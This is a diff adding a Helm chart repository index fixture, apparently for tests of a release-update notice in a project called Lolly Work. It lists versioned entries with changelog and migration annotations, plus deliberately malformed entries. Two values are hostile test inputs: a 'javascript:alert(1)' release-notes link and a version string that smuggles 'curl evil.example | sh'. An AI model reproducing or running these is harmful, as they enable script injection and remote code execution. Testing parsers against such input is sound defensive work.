@@ -1,0 +1,87 @@
+# A chart repository index in the form helm repo index writes, for the release
+# notice tests (tests/update-notice.test.ts) and a local browser check:
+#   LW_UPDATES_FEED_URL=http://127.0.0.1:<port>/index.yaml
+# 1.3.1 fixes a vulnerability and migrates, 1.3.0 migrates nothing, 1.4.0-rc.1 is
+# a preview, 1.2.9 is deprecated, and two entries are not valid releases.
+apiVersion: v1
+entries:
+  lolly-work:
+    - annotations:
+        artifacthub.io/containsSecurityUpdates: "true"
+        artifacthub.io/changes: |
+          - kind: security
+            description: Session cookies are refused on a plain HTTP origin behind a TLS proxy.
+          - kind: added
+            description: Owners and admins see a notice when a newer release is published, with the upgrade steps for how Lolly Work was installed.
+          - kind: fixed
+            description: The migration Job keeps its log until the next upgrade.
+        lolly.tools/migrations: "2"
+        lolly.tools/migration-classes: additive=2,maintenance=0
+        lolly.tools/release-notes: https://github.com/lolly-tools/lolly-work/releases/tag/v1.3.1
+      apiVersion: v2
+      appVersion: 1.3.1
+      created: 2026-12-02T10:15:00.000000000Z
+      digest: 1111111111111111111111111111111111111111111111111111111111111111
+      name: lolly-work
+      type: application
+      urls:
+        - https://github.com/lolly-tools/lolly-work/releases/download/chart-v1.3.1/lolly-work-1.3.1.tgz
+      version: 1.3.1
+    - annotations:
+        artifacthub.io/changes: |
+          - kind: added
+            description: Partner programmes can share a folder of templates.
+          - Plain-string changes are read too.
+        artifacthub.io/prerelease: "true"
+        lolly.tools/migrations: "0"
+        lolly.tools/migration-classes: additive=0,maintenance=0
+        lolly.tools/release-notes: https://github.com/lolly-tools/lolly-work/releases/tag/v1.4.0-rc.1
+      apiVersion: v2
+      appVersion: 1.4.0-rc.1
+      created: 2026-12-10T08:00:00Z
+      name: lolly-work
+      urls:
+        - https://github.com/lolly-tools/lolly-work/releases/download/chart-v1.4.0-rc.1/lolly-work-1.4.0-rc.1.tgz
+      version: 1.4.0-rc.1
+    - annotations:
+        artifacthub.io/changes: |
+          - kind: changed
+            description: Default server and render worker image tags follow Work 1.3.0.
+          - kind: unheard-of
+            description: An unknown kind reads as a change.
+        lolly.tools/migrations: "0"
+        lolly.tools/migration-classes: additive=0,maintenance=0
+        lolly.tools/release-notes: javascript:alert(1)
+      apiVersion: v2
+      appVersion: 1.3.0
+      created: 2026-11-20T09:00:00Z
+      name: lolly-work
+      urls:
+        - https://github.com/lolly-tools/lolly-work/releases/download/chart-v1.3.0/lolly-work-1.3.0.tgz
+      version: 1.3.0
+    - apiVersion: v2
+      appVersion: 1.2.9
+      deprecated: true
+      name: lolly-work
+      version: 1.2.9
+    - annotations:
+        artifacthub.io/changes: |
+          - kind: changed
+            description: The default demo pack is Lolly Demo in place of SUSE.
+      apiVersion: v2
+      appVersion: 1.2.0
+      created: 2026-11-09T20:33:47.865730707Z
+      name: lolly-work
+      urls:
+        - https://github.com/lolly-tools/lolly-work/releases/download/chart-v1.2.0/lolly-work-1.2.0.tgz
+      version: 1.2.0
+    - apiVersion: v2
+      appVersion: 1.1.3
+      created: 2026-10-29T16:20:54.236741458Z
+      name: lolly-work
+      version: 1.1.3
+    - name: lolly-work
+      version: "1.5.0; curl evil.example | sh"
+    - name: other-chart
+      version: 9.9.9
+generated: 2026-12-10T08:00:00Z
